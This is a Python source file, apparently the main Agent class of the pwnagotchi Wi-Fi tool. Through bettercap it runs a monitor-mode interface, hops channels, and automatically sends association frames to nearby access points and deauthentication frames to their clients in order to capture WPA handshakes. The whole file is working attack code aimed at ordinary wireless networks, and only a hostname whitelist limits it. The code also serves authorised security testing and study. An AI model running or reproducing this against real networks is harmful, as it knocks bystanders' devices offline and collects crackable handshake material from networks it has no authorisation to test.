import time
import json
import os
import re
import socket
from datetime import datetime
import logging
import _thread

import pwnagotchi.utils as utils
import pwnagotchi.plugins as plugins
from pwnagotchi.bettercap import Client
from pwnagotchi.mesh.utils import AsyncAdvertiser
from pwnagotchi.ai.train import AsyncTrainer

RECOVERY_DATA_FILE = '/root/.pwnagotchi-recovery'


class Agent(Client, AsyncAdvertiser, AsyncTrainer):
    def __init__(self, view, config, keypair):
        Client.__init__(self, config['bettercap']['hostname'],
                        config['bettercap']['scheme'],
                        config['bettercap']['port'],
                        config['bettercap']['username'],
                        config['bettercap']['password'])
        AsyncAdvertiser.__init__(self, config, view, keypair)
        AsyncTrainer.__init__(self, config)

        self._started_at = time.time()
        self._filter = None if config['main']['filter'] is None else re.compile(config['main']['filter'])
        self._current_channel = 0
        self._supported_channels = utils.iface_channels(config['main']['iface'])
        self._view = view
        self._access_points = []
        self._last_pwnd = None
        self._history = {}
        self._handshakes = {}

    @staticmethod
    def is_connected():
        try:
            socket.create_connection(("www.google.com", 80))
            return True
        except OSError:
            pass
        return False

    def config(self):
        return self._config

    def supported_channels(self):
        return self._supported_channels

    def set_starting(self):
        self._view.on_starting()

    def set_ready(self):
        plugins.on('ready', self)

    def set_free_channel(self, channel):
        self._view.on_free_channel(channel)
        plugins.on('free_channel', self, channel)

    def set_bored(self):
        self._view.on_bored()
        plugins.on('bored', self)

    def set_sad(self):
        self._view.on_sad()
        plugins.on('sad', self)

    def set_excited(self):
        self._view.on_excited()
        plugins.on('excited', self)

    def set_lonely(self):
        self._view.on_lonely()
        plugins.on('lonely', self)

    def set_rebooting(self):
        self._view.on_rebooting()
        plugins.on('rebooting', self)

    def setup_events(self):
        logging.info("connecting to %s ..." % self.url)

        for tag in self._config['bettercap']['silence']:
            try:
                self.run('events.ignore %s' % tag, verbose_errors=False)
            except Exception as e:
                pass

    def _reset_wifi_settings(self):
        mon_iface = self._config['main']['iface']
        self.run('set wifi.interface %s' % mon_iface)
        self.run('set wifi.ap.ttl %d' % self._config['personality']['ap_ttl'])
        self.run('set wifi.sta.ttl %d' % self._config['personality']['sta_ttl'])
        self.run('set wifi.rssi.min %d' % self._config['personality']['min_rssi'])
        self.run('set wifi.handshakes.file %s' % self._config['bettercap']['handshakes'])
        self.run('set wifi.handshakes.aggregate false')

    def start_monitor_mode(self):
        mon_iface = self._config['main']['iface']
        mon_start_cmd = self._config['main']['mon_start_cmd']
        restart = not self._config['main']['no_restart']
        has_mon = False

        while has_mon is False:
            s = self.session()
            for iface in s['interfaces']:
                if iface['name'] == mon_iface:
                    logging.info("found monitor interface: %s" % iface['name'])
                    has_mon = True
                    break

            if has_mon is False:
                if mon_start_cmd is not None and mon_start_cmd != '':
                    logging.info("starting monitor interface ...")
                    self.run('!%s' % mon_start_cmd)
                else:
                    logging.info("waiting for monitor interface %s ..." % mon_iface)
                    time.sleep(1)

        logging.info("supported channels: %s" % self._supported_channels)
        logging.info("handshakes will be collected inside %s" % self._config['bettercap']['handshakes'])

        self._reset_wifi_settings()

        wifi_running = self.is_module_running('wifi')
        if wifi_running and restart:
            logging.debug("restarting wifi module ...")
            self.restart_module('wifi.recon')
            self.run('wifi.clear')
        elif not wifi_running:
            logging.debug("starting wifi module ...")
            self.start_module('wifi.recon')

        self.start_advertising()

    def start(self):
        self.start_ai()
        self.setup_events()
        self.set_starting()
        self.start_monitor_mode()
        self.start_event_polling()
        # print initial stats
        self.next_epoch()
        self.set_ready()

    def wait_for(self, t, sleeping=True):
        plugins.on('sleep' if sleeping else 'wait', self, t)
        self._view.wait(t, sleeping)
        self._epoch.track(sleep=True, inc=t)

    def check_channels(self, channels):
        busy_channels = [ch for ch, aps in channels]
        # if we're hopping and no filter is configured
        if self._config['personality']['channels'] == [] and self._config['main']['filter'] is None:
            # check if any of the non overlapping channels is free
            for ch in self._epoch.non_overlapping_channels:
                if ch not in busy_channels:
                    self._epoch.non_overlapping_channels[ch] += 1
                    logging.info("channel %d is free from %d epochs" % (ch, self._epoch.non_overlapping_channels[ch]))
                elif self._epoch.non_overlapping_channels[ch] > 0:
                    self._epoch.non_overlapping_channels[ch] -= 1
            # report any channel that has been free for at least 3 epochs
            for ch, num_epochs_free in self._epoch.non_overlapping_channels.items():
                if num_epochs_free >= 3:
                    logging.info("channel %d has been free for %d epochs" % (ch, num_epochs_free))
                    self.set_free_channel(ch)

    def recon(self):
        recon_time = self._config['personality']['recon_time']
        max_inactive = self._config['personality']['max_inactive_scale']
        recon_mul = self._config['personality']['recon_inactive_multiplier']
        channels = self._config['personality']['channels']

        if self._epoch.inactive_for >= max_inactive:
            recon_time *= recon_mul

        self._view.set('channel', '*')

        if not channels:
            self._current_channel = 0
            logging.debug("RECON %ds" % recon_time)
            self.run('wifi.recon.channel clear')
        else:
            logging.debug("RECON %ds ON CHANNELS %s" % (recon_time, ','.join(map(str, channels))))
            try:
                self.run('wifi.recon.channel %s' % ','.join(map(str, channels)))
            except Exception as e:
                logging.exception("error")

        self.wait_for(recon_time, sleeping=False)

    def _filter_included(self, ap):
        return self._filter is None or \
               self._filter.match(ap['hostname']) is not None or \
               self._filter.match(ap['mac']) is not None

    def set_access_points(self, aps):
        self._access_points = aps
        plugins.on('wifi_update', self, aps)
        self._epoch.observe(aps, self._advertiser.peers() if self._advertiser is not None else ())
        return self._access_points

    def get_access_points(self):
        whitelist = self._config['main']['whitelist']
        aps = []
        try:
            s = self.session()
            for ap in s['wifi']['aps']:
                if ap['hostname'] not in whitelist:
                    if self._filter_included(ap):
                        aps.append(ap)
        except Exception as e:
            logging.exception("error")

        aps.sort(key=lambda ap: ap['channel'])
        return self.set_access_points(aps)

    def get_access_points_by_channel(self):
        aps = self.get_access_points()
        channels = self._config['personality']['channels']
        grouped = {}

        # group by channel
        for ap in aps:
            ch = ap['channel']
            # if we're sticking to a channel, skip anything
            # which is not on that channel
            if channels != [] and ch not in channels:
                continue

            if ch not in grouped:
                grouped[ch] = [ap]
            else:
                grouped[ch].append(ap)

        # sort by more populated channels
        return sorted(grouped.items(), key=lambda kv: len(kv[1]), reverse=True)

    def _find_ap_sta_in(self, station_mac, ap_mac, session):
        for ap in session['wifi']['aps']:
            if ap['mac'] == ap_mac:
                for sta in ap['clients']:
                    if sta['mac'] == station_mac:
                        return (ap, sta)
                return (ap, {'mac': station_mac, 'vendor': ''})
        return None

    def _update_uptime(self, s):
        secs = time.time() - self._started_at
        self._view.set('uptime', utils.secs_to_hhmmss(secs))
        self._view.set('epoch', '%04d' % self._epoch.epoch)

    def _update_counters(self):
        tot_aps = len(self._access_points)
        tot_stas = sum(len(ap['clients']) for ap in self._access_points)
        if self._current_channel == 0:
            self._view.set('aps', '%d' % tot_aps)
            self._view.set('sta', '%d' % tot_stas)
        else:
            aps_on_channel = len([ap for ap in self._access_points if ap['channel'] == self._current_channel])
            stas_on_channel = sum(
                [len(ap['clients']) for ap in self._access_points if ap['channel'] == self._current_channel])
            self._view.set('aps', '%d (%d)' % (aps_on_channel, tot_aps))
            self._view.set('sta', '%d (%d)' % (stas_on_channel, tot_stas))

    def _update_handshakes(self, new_shakes=0):
        if new_shakes > 0:
            self._epoch.track(handshake=True, inc=new_shakes)

        tot = utils.total_unique_handshakes(self._config['bettercap']['handshakes'])
        txt = '%d (%d)' % (len(self._handshakes), tot)

        if self._last_pwnd is not None:
            txt += ' [%s]' % self._last_pwnd[:20]

        self._view.set('shakes', txt)

        if new_shakes > 0:
            self._view.on_handshakes(new_shakes)

    def _update_advertisement(self, s):
        run_handshakes = len(self._handshakes)
        tot_handshakes = utils.total_unique_handshakes(self._config['bettercap']['handshakes'])
        started = s['started_at'].split('.')[0]
        started = datetime.strptime(started, '%Y-%m-%dT%H:%M:%S')
        started = time.mktime(started.timetuple())
        self._advertiser.update({ \
            'pwnd_run': run_handshakes,
            'pwnd_tot': tot_handshakes,
            'uptime': time.time() - started,
            'epoch': self._epoch.epoch})

    def _update_peers(self):
        peer = self._advertiser.closest_peer()
        tot = self._advertiser.num_peers()
        self._view.set_closest_peer(peer, tot)

    def _save_recovery_data(self):
        logging.warning("writing recovery data to %s ..." % RECOVERY_DATA_FILE)
        with open(RECOVERY_DATA_FILE, 'w') as fp:
            data = {
                'started_at': self._started_at,
                'epoch': self._epoch.epoch,
                'history': self._history,
                'handshakes': self._handshakes,
                'last_pwnd': self._last_pwnd
            }
            json.dump(data, fp)

    def _load_recovery_data(self, delete=True, no_exceptions=True):
        try:
            with open(RECOVERY_DATA_FILE, 'rt') as fp:
                data = json.load(fp)
                logging.info("found recovery data: %s" % data)
                self._started_at = data['started_at']
                self._epoch.epoch = data['epoch']
                self._handshakes = data['handshakes']
                self._history = data['history']
                self._last_pwnd = data['last_pwnd']

                if delete:
                    logging.info("deleting %s" % RECOVERY_DATA_FILE)
                    os.unlink(RECOVERY_DATA_FILE)
        except:
            if not no_exceptions:
                raise

    def _event_poller(self):
        self._load_recovery_data()

        self.run('events.clear')

        logging.debug("event polling started ...")
        while True:
            time.sleep(1)

            new_shakes = 0
            s = self.session()
            self._update_uptime(s)

            if self._advertiser is not None:
                self._update_advertisement(s)
                self._update_peers()

            self._update_counters()

            try:
                for h in [e for e in self.events() if e['tag'] == 'wifi.client.handshake']:
                    filename = h['data']['file']
                    sta_mac = h['data']['station']
                    ap_mac = h['data']['ap']
                    key = "%s -> %s" % (sta_mac, ap_mac)

                    if key not in self._handshakes:
                        self._handshakes[key] = h
                        new_shakes += 1
                        ap_and_station = self._find_ap_sta_in(sta_mac, ap_mac, s)
                        if ap_and_station is None:
                            logging.warning("!!! captured new handshake: %s !!!" % key)
                            self._last_pwnd = ap_mac
                            plugins.on('handshake', self, filename, ap_mac, sta_mac)
                        else:
                            (ap, sta) = ap_and_station
                            self._last_pwnd = ap['hostname'] if ap['hostname'] != '' and ap[
                                'hostname'] != '<hidden>' else ap_mac
                            logging.warning("!!! captured new handshake on channel %d: %s (%s) -> %s [%s (%s)] !!!" % ( \
                                ap['channel'],
                                sta['mac'], sta['vendor'],
                                ap['hostname'], ap['mac'], ap['vendor']))
                            plugins.on('handshake', self, filename, ap, sta)

            except Exception as e:
                logging.exception("error")

            finally:
                self._update_handshakes(new_shakes)

    def start_event_polling(self):
        _thread.start_new_thread(self._event_poller, ())

    def is_module_running(self, module):
        s = self.session()
        for m in s['modules']:
            if m['name'] == module:
                return m['running']
        return False

    def start_module(self, module):
        self.run('%s on' % module)

    def restart_module(self, module):
        self.run('%s off; %s on' % (module, module))

    def _has_handshake(self, bssid):
        for key in self._handshakes:
            if bssid.lower() in key:
                return True
        return False

    def _should_interact(self, who):
        if self._has_handshake(who):
            return False

        elif who not in self._history:
            self._history[who] = 1
            return True

        else:
            self._history[who] += 1

        return self._history[who] < self._config['personality']['max_interactions']

    def _on_miss(self, who):
        logging.info("it looks like %s is not in range anymore :/" % who)
        self._epoch.track(miss=True)
        self._view.on_miss(who)

    def _on_error(self, who, e):
        error = "%s" % e
        # when we're trying to associate or deauth something that is not in range anymore
        # (if we are moving), we get the following error from bettercap:
        # error 400: 50:c7:bf:2e:d3:37 is an unknown BSSID or it is in the association skip list.
        if 'is an unknown BSSID' in error:
            self._on_miss(who)
        else:
            logging.error("%s" % e)

    def associate(self, ap, throttle=0):
        if self.is_stale():
            logging.debug("recon is stale, skipping assoc(%s)" % ap['mac'])
            return

        if self._config['personality']['associate'] and self._should_interact(ap['mac']):
            self._view.on_assoc(ap)

            try:
                logging.info("sending association frame to %s (%s %s) on channel %d [%d clients]..." % ( \
                    ap['hostname'], ap['mac'], ap['vendor'], ap['channel'], len(ap['clients'])))
                self.run('wifi.assoc %s' % ap['mac'])
                self._epoch.track(assoc=True)
            except Exception as e:
                self._on_error(ap['mac'], e)

            plugins.on('association', self, ap)
            if throttle > 0:
                time.sleep(throttle)
            self._view.on_normal()

    def deauth(self, ap, sta, throttle=0):
        if self.is_stale():
            logging.debug("recon is stale, skipping deauth(%s)" % sta['mac'])
            return

        if self._config['personality']['deauth'] and self._should_interact(sta['mac']):
            self._view.on_deauth(sta)

            try:
                logging.info("deauthing %s (%s) from %s (%s %s) on channel %d ..." % (
                    sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'], ap['channel']))
                self.run('wifi.deauth %s' % sta['mac'])
                self._epoch.track(deauth=True)
            except Exception as e:
                self._on_error(sta['mac'], e)

            plugins.on('deauthentication', self, ap, sta)
            if throttle > 0:
                time.sleep(throttle)
            self._view.on_normal()

    def set_channel(self, channel, verbose=True):
        if self.is_stale():
            logging.debug("recon is stale, skipping set_channel(%d)" % channel)
            return

        # if in the previous loop no client stations has been deauthenticated
        # and only association frames have been sent, we don't need to wait
        # very long before switching channel as we don't have to wait for
        # such client stations to reconnect in order to sniff the handshake.
        wait = 0
        if self._epoch.did_deauth:
            wait = self._config['personality']['hop_recon_time']
        elif self._epoch.did_associate:
            wait = self._config['personality']['min_recon_time']

        if channel != self._current_channel:
            if self._current_channel != 0 and wait > 0:
                if verbose:
                    logging.info("waiting for %ds on channel %d ..." % (wait, self._current_channel))
                else:
                    logging.debug("waiting for %ds on channel %d ..." % (wait, self._current_channel))
                self.wait_for(wait)
            if verbose and self._epoch.any_activity:
                logging.info("CHANNEL %d" % channel)
            try:
                self.run('wifi.recon.channel %d' % channel)
                self._current_channel = channel
                self._epoch.track(hop=True)
                self._view.set('channel', '%d' % channel)

                plugins.on('channel_hop', self, channel)

            except Exception as e:
                logging.error("error: %s" % e)

    def is_stale(self):
        return self._epoch.num_missed > self._config['personality']['max_misses_for_recon']

    def any_activity(self):
        return self._epoch.any_activity

    def _reboot(self):
        self.set_rebooting()
        self._save_recovery_data()
        logging.warning("rebooting the system ...")
        os.system("/usr/bin/sync")
        os.system("/usr/sbin/shutdown -r now")

    def next_epoch(self):
        was_stale = self.is_stale()
        did_miss = self._epoch.num_missed

        self._epoch.next()

        # after X misses during an epoch, set the status to lonely
        if was_stale:
            logging.warning("agent missed %d interactions -> lonely" % did_miss)
            self.set_lonely()
        # after X times being bored, the status is set to sad
        elif self._epoch.inactive_for >= self._config['personality']['sad_num_epochs']:
            logging.warning("%d epochs with no activity -> sad" % self._epoch.inactive_for)
            self.set_sad()
        # after X times being inactive, the status is set to bored
        elif self._epoch.inactive_for >= self._config['personality']['bored_num_epochs']:
            logging.warning("%d epochs with no activity -> bored" % self._epoch.inactive_for)
            self.set_bored()
        # after X times being active, the status is set to happy / excited
        elif self._epoch.active_for >= self._config['personality']['excited_num_epochs']:
            logging.warning("%d epochs with activity -> excited" % self._epoch.active_for)
            self.set_excited()

        plugins.on('epoch', self, self._epoch.epoch - 1, self._epoch.data())

        if self._epoch.blind_for >= self._config['main']['mon_max_blind_epochs']:
            logging.critical("%d epochs without visible access points -> rebooting ..." % self._epoch.blind_for)
            self._reboot()
            self._epoch.blind_for = 0
